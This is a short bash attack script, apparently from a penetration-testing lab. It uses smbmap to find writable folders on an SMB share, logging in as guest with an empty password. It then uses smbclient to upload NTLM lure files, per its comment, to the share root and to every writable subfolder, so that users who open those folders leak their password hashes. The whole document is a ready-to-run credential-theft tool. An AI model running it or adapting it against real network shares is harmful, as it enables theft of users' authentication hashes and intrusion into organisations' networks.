# put all ntlm file on each subfolder
username='guest'
password=''
host='10.10.103.36'
sharename='share'

smbmap -u "$username" -p "$password" -H "$host" -r "$sharename" --depth 5 --dir-only --csv output.csv

# root directory
echo "[*] Trying to root folder"
smbclient "//$host/$sharename" -U "$username%$password" -c 'prompt OFF; mput *'

# sub-directory
while IFS= read -r line
do
  permission=$(echo "$line" | awk -F "," '{print $3}')
  if [ "$permission" = "READ_WRITE" ]; then 
     share_path=$(echo "$line" | awk -F "," '{print $5}')
     share_name=$(echo "$share_path" | awk -F '//' '{print $1}')
     target_path=$(echo "$share_path" | awk -F '//' '{print $2}')
     
     echo "[*] Process $share_name : $target_path"
     smbclient "//$host/$sharename" -U "$username%$password" -c "cd $target_path; prompt OFF; mput *"
  fi
done < output.csv